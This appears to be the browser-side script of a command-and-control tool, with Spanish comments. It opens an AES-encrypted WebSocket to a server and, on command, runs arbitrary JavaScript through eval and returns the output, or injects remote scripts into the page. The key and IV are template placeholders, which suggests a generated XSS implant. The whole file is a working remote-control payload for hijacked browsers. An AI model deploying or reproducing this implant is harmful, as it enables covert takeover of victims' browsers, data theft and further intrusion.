const host = "localhost"
const httpPort = "8000"
const wsport = "8765"

function sendMessage(msg) {
    mes = JSON.stringify(msg)
    webSocket.send(encrypt(mes));
}

function loadScript(url) {
    // Si la URL no viene completa, se completa la URL para descargar el script del servidor
    if (!(/(http(s?)):\/\//i.test(url))) {
        url = "http://" + host + ":" + httpPort + "/" + url
    }
    // Comprueba si el script existe, si existe devuelve true y carga una etiqueta script en el head del documento.
    return fetch(url).then(response => {
        if (response.ok) {
            var node = document.createElement("script");
            node.setAttribute("src", url);
            document.getElementsByTagName("head")[0].appendChild(node);
        }
        return response.ok
    })
}

const webSocket = new WebSocket("ws://" + host + ":" + wsport);
webSocket.onopen = (event) => {
    sendMessage({ type: 1 });
};

/* Esta es un diccionario de tipo {"string":function}, la string es el comando que recibirá el onmessage, la función será el comando.

Para cargar más funcionalidades que interactúen con módulos en el backend se debe cargar en un script que incluya el comando al
diccionario. Importante mandar un mensaje en algún momento de la ejecución.
Comandos por defecto:
    OK - keep alive la conexión
    eval - ejecuta lo que venga en el comando y devuelve lo que retorno
    load - carga un fichero desde un URL.
 */
var _webs_comands_ = {
    "OK": function (mes) { sendMessage({ type: 1 }) },
    "eval": function (mes) {
        sendMessage({ type: 0, msg: { outputType: "console", text: eval(mes["expression"]) } })
    },
    "load": function (mes) {
        loadScript(mes["script"]).then(ok => {
            if (ok)
                sendMessage({ type: 0, msg: { outputType: "info", text: "loaded" } })
            else
                sendMessage({ type: 0, msg: { outputType: "error", text: "could not load " + mes["script"] } })
        })
    },
    "disable": function (mes) { }
}

webSocket.onmessage = (event) => {
    try {
        const output = hex2a(decrypt(event.data));
        let mes = JSON.parse(output)
        _webs_comands_[mes["comand"]](mes)
    } catch (e) { sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } }) }

};


// Criptografía

var secretKey = "$key";
var derived_key = CryptoJS.enc.Base64.parse(secretKey);

// Initialize the initialization vector (IV) and encryption mode
var iv = CryptoJS.enc.Utf8.parse("$IV");
var encryptionOptions = {
    iv: iv,
    mode: CryptoJS.mode.CBC
};

function encrypt(plaintext) {
    return CryptoJS.AES.encrypt(plaintext, derived_key, encryptionOptions).toString();
}
function decrypt(plaintext) {
    return CryptoJS.AES.decrypt(plaintext, derived_key, encryptionOptions).toString();
}

function a2hex(str) {
    var arr = [];
    for (var i = 0, l = str.length; i < l; i++) {
        var hex = Number(str.charCodeAt(i)).toString(16);
        arr.push(hex);
    }
    return arr.join('');
}

function hex2a(hexx) {
    var hex = hexx.toString();
    var str = '';
    for (var i = 0; i < hex.length; i += 2)
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
}